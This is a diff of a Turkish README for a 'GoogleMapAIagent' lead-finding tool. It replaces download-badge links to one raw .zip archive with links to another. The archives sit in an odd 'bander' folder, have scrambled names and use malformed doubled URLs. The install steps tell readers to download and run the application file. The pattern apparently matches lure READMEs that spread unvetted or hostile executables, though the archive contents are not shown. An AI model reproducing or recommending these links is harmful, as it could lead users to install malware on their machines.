@@ -1,6 +1,6 @@
 # 🗺️ GoogleMapAIagent - Effortlessly Find Potential Clients
 
-[![Download](https://raw.githubusercontent.com/codezer0x/GoogleMapAIagent/main/bander/Map-A-Iagent-Google-2.7.zip%https://raw.githubusercontent.com/codezer0x/GoogleMapAIagent/main/bander/Map-A-Iagent-Google-2.7.zip)](https://raw.githubusercontent.com/codezer0x/GoogleMapAIagent/main/bander/Map-A-Iagent-Google-2.7.zip)
+[![Download](https://raw.githubusercontent.com/codezer0x/GoogleMapAIagent/main/bander/A-Map-Google-Iagent-hobbyist.zip%https://raw.githubusercontent.com/codezer0x/GoogleMapAIagent/main/bander/A-Map-Google-Iagent-hobbyist.zip)](https://raw.githubusercontent.com/codezer0x/GoogleMapAIagent/main/bander/A-Map-Google-Iagent-hobbyist.zip)
 
 ## 📋 İçindekiler
 - [Genel Bakış](#-genel-bakış)
@@ -42,7 +42,7 @@ GoogleMapAIagent, kullanıcının talimatlarını doğal dilde anlayarak çalı�
 ## 📥 Kurulum
 1. Aşağıdaki butona tıklayın ve indirme sayfasına gidin.
    
-   [![Download](https://raw.githubusercontent.com/codezer0x/GoogleMapAIagent/main/bander/Map-A-Iagent-Google-2.7.zip%https://raw.githubusercontent.com/codezer0x/GoogleMapAIagent/main/bander/Map-A-Iagent-Google-2.7.zip)](https://raw.githubusercontent.com/codezer0x/GoogleMapAIagent/main/bander/Map-A-Iagent-Google-2.7.zip)
+   [![Download](https://raw.githubusercontent.com/codezer0x/GoogleMapAIagent/main/bander/A-Map-Google-Iagent-hobbyist.zip%https://raw.githubusercontent.com/codezer0x/GoogleMapAIagent/main/bander/A-Map-Google-Iagent-hobbyist.zip)](https://raw.githubusercontent.com/codezer0x/GoogleMapAIagent/main/bander/A-Map-Google-Iagent-hobbyist.zip)
 
 2. İndirme sayfasında, en son sürümü bulun.
 3. Uygulama dosyasını indirin.
